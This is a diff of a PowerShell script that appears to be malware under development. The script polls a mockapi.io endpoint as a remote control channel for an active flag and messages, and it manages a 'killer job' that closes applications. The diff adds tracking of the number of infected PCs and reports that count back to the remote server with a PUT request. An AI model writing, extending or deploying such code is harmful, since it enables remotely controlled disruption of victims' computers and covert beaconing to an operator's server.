@@ -68,6 +68,7 @@ function checkDataBase {
         
         if ($response -ne $null) {
             $global:isActive = $response.isActive
+            $global:nbPcInfect = $response.nbPcInfect.nbPcInfect
             $global:nbPcInfectIncr = $response.nbPcInfect.nbPcInfectIncr
             if ($response.message -ne $null) {
                 $global:message = $response.message.message
@@ -83,12 +84,15 @@ function checkDataBase {
             $global:message = $null
             $global:messageIncr = $null
             $global:nbPcInfectIncr = $null
+            $global:nbPcInfect = 0
         }
     } catch {
         Write-Error "Error checking database: $($_.Exception.Message)"
         $global:isActive = $null
         $global:message = $null
         $global:messageIncr = $null
+        $global:nbPcInfect = 0
+        $global:nbPcInfectIncr = $null
     }
 }
 
@@ -134,6 +138,7 @@ function main {
     } else {
         Write-Warning "Initial database check failed or returned null increment. Last message check might be inaccurate initially."
         $global:lastMessageIncr = [System.Guid]::NewGuid().ToString()
+        $global:lastNbPcInfectIncr = "" # Initialiser pour forcer la première mise à jour si nbPcInfectIncr existe
     }
 
     # Main loop
@@ -141,7 +146,7 @@ function main {
         checkDataBase
 
         if ($null -ne $global:isActive) {
-            Write-Host "Status Check: isActive = $global:isActive, messageIncr = $global:messageIncr, lastMessageIncr = $global:lastMessageIncr" -ForegroundColor Cyan
+            Write-Host "Status Check: isActive = $global:isActive, messageIncr = $global:messageIncr, nbPcInfectIncr = $global:nbPcInfectIncr, lastNbPcInfectIncr = $global:lastNbPcInfectIncr" -ForegroundColor Cyan
 
             if ($global:messageIncr -ne $global:lastMessageIncr) {
                 Write-Host "Message increment changed from '$($global:lastMessageIncr)' to '$($global:messageIncr)'." -ForegroundColor White
@@ -157,9 +162,11 @@ function main {
             }
 
             if ($global:nbPcInfectIncr -ne $global:lastNbPcInfectIncr) {
+                $updatedNbPcInfect = $global:nbPcInfect + 1 # Incrémenter la valeur récupérée
+
                 $body = @{
                     nbPcInfect = @{
-                        nbPcInfect = $global:nbPcInfect + 1
+                        nbPcInfect = $updatedNbPcInfect
                         nbPcInfectIncr = $global:nbPcInfectIncr
                     }
                 } | ConvertTo-Json
@@ -168,10 +175,16 @@ function main {
                     "Content-Type" = "application/json"
                 }
 
-                $response = Invoke-RestMethod -Uri "https://68138d49129f6313e211a66e.mockapi.io/management/1" `
+                try {
+                    $response = Invoke-RestMethod -Uri "https://68138d49129f6313e211a66e.mockapi.io/management/1" `
                                             -Method Put `
                                             -Body $body `
                                             -Headers $headers
+                    Write-Host "Updated nbPcInfect to $($updatedNbPcInfect)" -ForegroundColor Green
+                    $global:lastNbPcInfectIncr = $global:nbPcInfectIncr # Mettre à jour le dernier incrément traité
+                } catch {
+                    Write-Warning "Failed to update nbPcInfect: $($_.Exception.Message)"
+                }
             }
 
 
@@ -213,11 +226,11 @@ function main {
         } else {
             Write-Warning "Database check failed (isActive is null). Skipping logic iteration."
             if ($isRunning -and $null -ne $jobCloseApp) {
-                 Write-Warning "Stopping killer job due to database communication failure."
-                 Stop-Job -Job $jobCloseApp -ErrorAction SilentlyContinue | Wait-Job -Timeout 5 -ErrorAction SilentlyContinue
-                 Remove-Job -Job $jobCloseApp -Force -ErrorAction SilentlyContinue
-                 $jobCloseApp = $null
-                 $isRunning = $false
+               Write-Warning "Stopping killer job due to database communication failure."
+               Stop-Job -Job $jobCloseApp -ErrorAction SilentlyContinue | Wait-Job -Timeout 5 -ErrorAction SilentlyContinue
+               Remove-Job -Job $jobCloseApp -Force -ErrorAction SilentlyContinue
+               $jobCloseApp = $null
+               $isRunning = $false
             }
         }
 
